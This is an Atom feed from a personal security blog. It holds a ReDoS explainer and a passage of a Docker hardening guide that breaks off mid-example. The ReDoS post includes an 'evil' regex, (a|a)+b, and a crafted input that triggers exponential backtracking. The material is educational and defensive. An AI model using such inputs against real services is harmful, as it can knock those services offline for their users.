<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Martin Thoma - Security</title><link href="https://martin-thoma.com/" rel="alternate"></link><link href="https://martin-thoma.com/feeds/security.atom.xml" rel="self"></link><id>https://martin-thoma.com/</id><updated>2022-01-01T20:00:00+01:00</updated><subtitle>A blog about Code, the Web and Cyberculture</subtitle><entry><title>ReDoS ‚Äî Denial of Service by RegEx üòà</title><link href="https://martin-thoma.com/redos/" rel="alternate"></link><published>2022-01-01T20:00:00+01:00</published><updated>2022-01-01T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2022-01-01:/redos/</id><summary type="html">&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2022/03/redos-title.png"&gt;&lt;img alt="A redos example" src="../images/2022/03/redos-title.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;A redos example&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Regular expressions (RegEx) are a formal language to define simple patterns. It is commonly used to find interesting parts within a larger body of text or to validate data. It is typically fast and sometimes a clean solution. However, in some cases, an attacker can craft input ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2022/03/redos-title.png"&gt;&lt;img alt="A redos example" src="../images/2022/03/redos-title.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;A redos example&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Regular expressions (RegEx) are a formal language to define simple patterns. It is commonly used to find interesting parts within a larger body of text or to validate data. It is typically fast and sometimes a clean solution. However, in some cases, an attacker can craft input to a vulnerable regular expression which causes the time to check the input for the regex to be way longer than expected.&lt;/p&gt;
&lt;h2 id="why-you-should-care"&gt;Why you should care&lt;/h2&gt;
&lt;p&gt;I&amp;rsquo;ve only found one example of a successful ReDoS &amp;ldquo;attack&amp;rdquo;. In 2016, 34 minutes of outage of StackOverflow was caused by ReDoS (&lt;a href="https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016"&gt;source&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/ReDoS"&gt;Wikipedia&lt;/a&gt; and &lt;a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"&gt;OWASP&lt;/a&gt; don&amp;rsquo;t mention a single successful attack. I guess the reason for that is that RegEx is not used that often on the server-side ü§∑&amp;zwj;‚ôÇÔ∏è There are a &lt;a href="https://nedbatchelder.com/text/python-parsers.html"&gt;lot of parsing tools&lt;/a&gt; for Python, but I only vaguely remember using &lt;a href="https://github.com/pyparsing/pyparsing"&gt;pyparsing&lt;/a&gt; once.&lt;/p&gt;
&lt;p&gt;In many cases when you might want to use a regex, doing it completely correctly is just overkill. For example, &lt;a href="https://stackoverflow.com/questions/201323/how-can-i-validate-an-email-address-using-a-regular-expression"&gt;email regexes&lt;/a&gt;. Instead of jumping in that rabbit hole, you can just do some super basic checks, e.g. if the length is at least 3 and if there is exactly one @ symbol in there. Then you just send a confirmation email which verifies that the user actually has access to this email address.&lt;/p&gt;
&lt;p&gt;For URLs, you can typically just ping them. For HTML, you want to use an HTML parser. For many other cases, using split goes a long way.&lt;/p&gt;
&lt;p&gt;What I want to say: It might be that you don&amp;rsquo;t need to worry as you might not use RegEx in most of your code. It&amp;rsquo;s interesting nevertheless üòÅ&lt;/p&gt;
&lt;h2 id="an-introduction-to-pcre"&gt;An Introduction to PCRE&lt;/h2&gt;
&lt;p&gt;Perl Compatible Regular Expressions (PCRE) are the most common style of regular expressions. They are a way to specify types of strings. They are way more specific than just wildcard pattern matching.&lt;/p&gt;
&lt;p&gt;For example, the following pattern matches first a single uppercase letter and then arbitrary many lowercase letters:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[A-Z][a-z]*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The characters within the square brackets [...] define the character class. In this case, all characters from A to Z . The * is a quantifier and means &amp;ldquo;at least zero, but up to arbitrary many&amp;rdquo;.&lt;/p&gt;
&lt;h2 id="regex-engines"&gt;RegEx Engines&lt;/h2&gt;
&lt;p&gt;You&amp;rsquo;ve seen in the previous section how regular expressions are written. Next you need to get a grasp of how it&amp;rsquo;s checked if a regular expression matches a given text. That&amp;rsquo;s done by a RegEx engine.&lt;/p&gt;
&lt;p&gt;The RegEx engine of Python uses &lt;strong&gt;recursive backtracking&lt;/strong&gt;, which can have exponential asymptotic execution time (see &lt;a href="https://eprints.whiterose.ac.uk/109809/1/jsre_journal_accepted_author_manuscript.pdf"&gt;Optimizing Unicode Regular Expression Evaluation with Previews&lt;/a&gt;). There are engines like &lt;a href="https://github.com/facebook/pyre2"&gt;pyre2&lt;/a&gt; which use the &lt;a href="https://swtch.com/~rsc/regexp/regexp1.html"&gt;Thompson NFA algorithm&lt;/a&gt;. The only reason I see for using the backtracking algorithm are backreferences, e.g. when you want to check if a word is duplicated. you can recognize those by \1 or similar in the regex.&lt;/p&gt;
&lt;p&gt;The idea of recursive backtracking is to match the string step-by-step. It keeps a list of possibilities that could match and eliminates them step-by-step.&lt;/p&gt;
&lt;h2 id="how-does-a-redos-attack-work"&gt;How does a ReDoS Attack work?&lt;/h2&gt;
&lt;p&gt;Think about the regular expression (a|a)+b as represented here:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Non-deterministic finite automaton (NFA) representation of the regex &amp;ldquo;(a|a)+b&amp;rdquo;. Created via regexper.com" src="https://cdn-images-1.medium.com/max/2000/1*5udiwCeCPAb8YDTsTZ4boA.png"/&gt;&lt;em&gt;Non-deterministic finite automaton (NFA) representation of the regex &amp;ldquo;(a|a)+b&amp;rdquo;. Created via &lt;a href="https://regexper.com/"&gt;regexper.com&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2022/03/regex-automaton.png"&gt;&lt;img alt="Non-deterministic finite automaton (NFA) representation of the regex &amp;ldquo;(a|a)+b&amp;rdquo;. Created via regexper.com" src="../images/2022/03/regex-automaton.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Non-deterministic finite automaton (NFA) representation of the regex &amp;ldquo;(a|a)+b&amp;rdquo;. Created via regexper.com&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Although both sides of the first group are identical &amp;mdash; just &amp;ldquo;a&amp;rdquo; &amp;mdash; the recusive backtracking algorithm will still keep track of both possible matches. Meaning with every &amp;ldquo;a&amp;rdquo; in the input, it doubles the possible paths to match. Meaning if you have 26 times a, there will be 2&amp;sup2;‚Å∂ = 67,108,864 paths to evaluate:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;

&lt;span class="n"&gt;pattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"**(a|a)+b**"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;evil_input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"aaaaaaaaaaaaaaaaaaaaaaaaaa"&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;evil_input&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"üí£üß®üí•"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Executing this takes almost 7 seconds on my machine &amp;mdash; impressively fast considering the number of possible options, but extremely slow if you remember that you can see at a single glance that this string cannot match.&lt;/p&gt;
&lt;p&gt;If you have a vulnerable regular expression &amp;mdash; also called &amp;ldquo;evil regex&amp;rdquo; &amp;mdash; and an input that causes the exponential matching time, the machine will take quite some CPU resources to evaluate the expression on the input. In the worst case, your service will become unavailable to the other users of that machine. The regular expression denial of service attack (ReDOS) was successful.&lt;/p&gt;
&lt;h2 id="how-can-i-prevent-redos-attacks"&gt;How can I prevent ReDos attacks?&lt;/h2&gt;
&lt;p&gt;If you don&amp;rsquo;t use regular expressions and don&amp;rsquo;t provide your users the option to use them, you&amp;rsquo;re save.&lt;/p&gt;
&lt;p&gt;If you use a regular expression engine which does not use backtracking, you should also be save.&lt;/p&gt;
&lt;p&gt;Or if your regular expressions are not &amp;ldquo;evil&amp;rdquo; you also don&amp;rsquo;t have this issue. However, recognizing evil regular expressions is hard:
&lt;a href="https://stackoverflow.com/q/12841970/562769"&gt;&lt;strong&gt;How can I recognize an evil regex?&lt;/strong&gt;
&lt;em&gt;Because computers do exactly what you tell them to do, even if it's not what you meant or is totally unreasonable. If&amp;hellip;&lt;/em&gt;stackoverflow.com&lt;/a&gt;
&lt;a href="https://stackoverflow.com/questions/58345142/is-this-regex-vulnerable-to-redos-attacks/58347192#58347192"&gt;&lt;strong&gt;is this regex vulnerable to REDOS attacks&lt;/strong&gt;
&lt;em&gt;Testing on regex101.com shows that there are no combinations of inputs that create runaway checks - but your regex is&amp;hellip;&lt;/em&gt;stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòàüêù&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòàüêù&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòàüêù&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 15: &lt;a href="https://levelup.gitconnected.com/credential-stuffing-ff58ee8c3320"&gt;Credential Stuffing&lt;/a&gt; üòàüêù&lt;/li&gt;
&lt;li&gt;Part 16: &lt;a href="https://medium.com/plain-and-simple/multi-factor-authentication-cefff819be95"&gt;Multi-Factor Authentication&lt;/a&gt; (MFA/2FA) üòá&lt;/li&gt;
&lt;li&gt;Part 17: ReDoS üòà&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The following articles are about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 18: Secure Messaging üòá&lt;/li&gt;
&lt;li&gt;Part 19: Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Part 20: Backups üòá&lt;/li&gt;
&lt;li&gt;Part 21: Cryptotrojans üòà&lt;/li&gt;
&lt;li&gt;Part 22: Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Part 23: Clipboard Hijacking üòà&lt;/li&gt;
&lt;li&gt;Part 24: Certificates üòá&lt;/li&gt;
&lt;li&gt;Part 25: Race Condition Attacks in Blockchains üòà&lt;/li&gt;
&lt;li&gt;Part 26: Mobile Device Management (MDM) üòá&lt;/li&gt;
&lt;li&gt;Part 27: Server-Side Request Forgery (SSRF) üòà&lt;/li&gt;
&lt;li&gt;Part 28: Network Separation üòá&lt;/li&gt;
&lt;li&gt;Part 29: Social Engineering (including Phising) üòà&lt;/li&gt;
&lt;li&gt;Part 30: Virtual Private Networks (VPNs) üòá&lt;/li&gt;
&lt;li&gt;Part 31: CSRF üòà&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;
&lt;p&gt;I love writing about software development and technology ü§© Don&amp;rsquo;t miss updates: &lt;a href="https://martinthoma.medium.com/subscribe"&gt;**Get my free email newsletter&lt;/a&gt;** üìß or &lt;a href="https://martinthoma.medium.com/membership"&gt;sign up for Medium&lt;/a&gt; ‚úçÔ∏è if you haven&amp;rsquo;t done it yet &amp;mdash; both encourage me to write more ü§ó&lt;/p&gt;</content><category term="Security"></category></entry><entry><title>Docker Security üòá</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/docker-security-5f4df118948c" rel="alternate"></link><published>2021-02-06T20:00:00+01:00</published><updated>2021-02-06T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2021-02-06:/https://levelup.gitconnected.com/docker-security-5f4df118948c</id><summary type="html">&lt;p&gt;&lt;img alt="Photo by Andrey Sharpilo on Unsplash" src="https://cdn-images-1.medium.com/max/9600/0*r4ZMVDm0J0WtgNKQ"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@sharpiloa?utm_source=medium&amp;amp;utm_medium=referral"&gt;Andrey Sharpilo&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Most companies I have seen deploy Docker images in at least one project or service. Docker is great because it makes stuff reproducible by specifying the environment to a big degree. However, you still have to think about security. Let&amp;rsquo;s have a closer ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Photo by Andrey Sharpilo on Unsplash" src="https://cdn-images-1.medium.com/max/9600/0*r4ZMVDm0J0WtgNKQ"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@sharpiloa?utm_source=medium&amp;amp;utm_medium=referral"&gt;Andrey Sharpilo&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Most companies I have seen deploy Docker images in at least one project or service. Docker is great because it makes stuff reproducible by specifying the environment to a big degree. However, you still have to think about security. Let&amp;rsquo;s have a closer look!&lt;/p&gt;
&lt;h2 id="host-security"&gt;Host Security&lt;/h2&gt;
&lt;p&gt;All Docker containers run on a host system. The host needs to be secure AND the container needs to be secure.&lt;/p&gt;
&lt;p&gt;There are various vulnerability scanning, auditing, and hardening tools for Linux systems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cisofy.com/lynis/"&gt;Lynis&lt;/a&gt;: Executesudo apt-get install lynis &amp;amp;&amp;amp; sudo lynis audit system and wait for a couple of minutes and you get a pretty nice report indicating what you can do to harden your system.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Security-Enhanced_Linux"&gt;SELinux&lt;/a&gt;: Provides Mandatory Access Control (MAC) as a kernel-module. Thomas Cameron gave an &lt;a href="https://www.youtube.com/watch?v=_WOKRaM-HI4"&gt;introduction to SELinux&lt;/a&gt;. The key point for SELinux and AppArmor is the Access control policy. Linux, by default, uses Discretionary Access Control (DAC). SELinux and AppArmor enforce MAC. &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Learn more about the differences&lt;/a&gt;. &lt;a href="undefined"&gt;Luc Juggery&lt;/a&gt; gave a nice introduction to &lt;a href="https://medium.com/lucjuggery/docker-selinux-30-000-foot-view-30f6ef7f621"&gt;SELinux &amp;amp; Docker&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/AppArmor"&gt;AppArmor&lt;/a&gt;: Provides MAC as a service. It distinguishes unconfined and confined processes. It ignores unconfined processes. Confined processes may only do what they are allowed to do according to the AppArmor profile of that process. &lt;a href="http://sarnold.org/resume/sarnold.html"&gt;Seth Arnold&lt;/a&gt; gave a nice talk about &lt;a href="https://www.youtube.com/watch?v=PRZ59lxLlOY"&gt;AppArmor 3.0&lt;/a&gt;. Again, &lt;a href="undefined"&gt;Luc Juggery&lt;/a&gt; wrote a hands-on guide for &lt;a href="https://medium.com/lucjuggery/docker-apparmor-30-000-foot-view-60c5a5deb7b"&gt;AppArmor &amp;amp; Docker&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Docker Daemon: Run the daemon as a non-privileged user. Especially not as root.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You should run regular checks against vulnerability databases. If they find an
issue, you need an effective way to get notified, e.g. by posting to a Slack
channel.&lt;/p&gt;
&lt;p&gt;You could also use an OS that is optimized for containers, e.g. &lt;a href="https://cloud.google.com/container-optimized-os"&gt;Googles
Container-Optimized OS&lt;/a&gt;
(COS).&lt;/p&gt;
&lt;p&gt;There are many more things to say about the host system, but that is not the
focus of this article. If you&amp;rsquo;re interested, I&amp;rsquo;ll write a follow-up üôÇ&lt;/p&gt;
&lt;h2 id="base-image"&gt;Base Image&lt;/h2&gt;
&lt;p&gt;The base image is the foundation of your docker image. Within your Dockerfile,
you define the base image with FROM . For me, it typically is
&lt;a href="https://hub.docker.com/_/python"&gt;python:3.8.7-slim-buster&lt;/a&gt; or similar. You
need to ask yourself:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Do I trust the base images&amp;rsquo; author to have good intentions?&lt;/li&gt;
&lt;li&gt;Do I trust the base images&amp;rsquo; author to have a secure development setup so that malware isn&amp;rsquo;t uploaded unintentionally, e.g. by leaking the credentials to the account or password re-use?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You should also scan your base image for vulnerabilities. Even for very
standard images, there are often vulnerabilities. Some can be fixed by
directly running an update (e.g. RUN apt-get update &amp;amp;&amp;amp; apt-get upgrade),
others don&amp;rsquo;t have an update within the repository. But pretty often you also
don&amp;rsquo;t need all the installed stuff.&lt;/p&gt;
&lt;p&gt;Be aware that alpine does only share vulnerabilities that they have already
fixed. So the scan might look better for them, although they are not better.
Alpine images are smaller, though. So the attack surface is smaller.&lt;/p&gt;
&lt;h2 id="harden-your-image"&gt;Harden Your Image&lt;/h2&gt;
&lt;p&gt;Hardening is the process of reducing the attack surface or increasing the
difficulty to find and use existing vulnerability. It reduces the blast radius
any ticking bomb in your system could have.&lt;/p&gt;
&lt;h3 id="copy-only-necessary-files"&gt;Copy only necessary files&lt;/h3&gt;
&lt;p&gt;You can use the
&lt;a href="https://docs.docker.com/engine/reference/builder/#dockerignore-file"&gt;.dockerignore&lt;/a&gt;
file to make sure that some files are not added.&lt;/p&gt;
&lt;h3 id="run-non-privileged-user-in-the-container"&gt;Run non-privileged user in the container&lt;/h3&gt;
&lt;p&gt;By default, the code you execute within a docker container runs with the user
ID 0 &amp;mdash; with root. It is recommended not to do that. You can change that in
multiple ways:&lt;/p&gt;
&lt;p&gt;Within the Dockerfile &amp;mdash; I prefer that one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;groupadd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;noroot&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;useradd&lt;span class="w"&gt; &lt;/span&gt;-r&lt;span class="w"&gt; &lt;/span&gt;-g&lt;span class="w"&gt; &lt;/span&gt;noroot&lt;span class="w"&gt; &lt;/span&gt;noroot
&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;noroot&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When you start the container:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-u&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster&lt;span class="w"&gt; &lt;/span&gt;bash
I&lt;span class="w"&gt; &lt;/span&gt;have&lt;span class="w"&gt; &lt;/span&gt;no&lt;span class="w"&gt; &lt;/span&gt;name!@a70ba4f24042:/$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$UID&lt;/span&gt;
&lt;span class="m"&gt;1000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In Kubernetes via RunAsUser in the securityContext
(&lt;a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/"&gt;docs&lt;/a&gt;).&lt;/p&gt;
&lt;h3 id="multi-stage-builds"&gt;Multi-Stage Builds&lt;/h3&gt;
&lt;p&gt;If an attacker gets access to your container, you want them to have as few tools there as possible. Use &lt;a href="https://docs.docker.com/develop/develop-images/multistage-build/"&gt;multi-stage builds&lt;/a&gt; for that. Build your code in a build-container and use the built artifact in another container. As a bonus, your image size will be smaller.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://docs.docker.com/develop/develop-images/multistage-build/"&gt;Docker docs&lt;/a&gt; give a very good example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;golang:1.7.3&lt;/span&gt;
&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;/go/src/github.com/alexellis/href-counter/&lt;/span&gt;
&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;go&lt;span class="w"&gt; &lt;/span&gt;get&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;golang.org/x/net/html
&lt;span class="k"&gt;COPY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;app.go&lt;span class="w"&gt; &lt;/span&gt;.
&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;CGO_ENABLED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;GOOS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;linux&lt;span class="w"&gt; &lt;/span&gt;go&lt;span class="w"&gt; &lt;/span&gt;build&lt;span class="w"&gt; &lt;/span&gt;-a&lt;span class="w"&gt; &lt;/span&gt;-installsuffix&lt;span class="w"&gt; &lt;/span&gt;cgo&lt;span class="w"&gt; &lt;/span&gt;-o&lt;span class="w"&gt; &lt;/span&gt;app&lt;span class="w"&gt; &lt;/span&gt;.

&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;alpine:latest&lt;/span&gt;
&lt;span class="k"&gt;RUN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;apk&lt;span class="w"&gt; &lt;/span&gt;--no-cache&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;ca-certificates
&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;/root/&lt;/span&gt;
&lt;span class="k"&gt;COPY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;**--from&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;**&lt;span class="w"&gt; &lt;/span&gt;/go/src/github.com/alexellis/href-counter/app&lt;span class="w"&gt; &lt;/span&gt;.
&lt;span class="k"&gt;CMD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"./app"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="harden-your-containers_1"&gt;Harden Your Containers&lt;/h2&gt;
&lt;h3 id="read-only-root-file-system"&gt;Read-Only Root File System&lt;/h3&gt;
&lt;p&gt;This depends on how you run the docker image, but if you use docker run you can add the &lt;a href="https://docs.docker.com/engine/reference/commandline/run/"&gt;--read-only flag&lt;/a&gt;. This makes the root file system read-only. This means if an attacker gets into the system, they cannot store anything on disk or change any of the executables. They can still change the memory.&lt;/p&gt;
&lt;p&gt;You should also be aware that some pretty standard tasks like creating a temporary file obviously don&amp;rsquo;t work anymore:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;docker&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;-it&lt;span class="w"&gt; &lt;/span&gt;--read-only&lt;span class="w"&gt; &lt;/span&gt;python:3.9.1-buster
Python&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.9.1&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;default,&lt;span class="w"&gt; &lt;/span&gt;Jan&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2021&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;:45:25&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;GCC&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.3.0&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;on&lt;span class="w"&gt; &lt;/span&gt;linux
Type&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"help"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"copyright"&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"credits"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;or&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"license"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;more&lt;span class="w"&gt; &lt;/span&gt;information.
&amp;gt;&amp;gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;import&lt;span class="w"&gt; &lt;/span&gt;tempfile
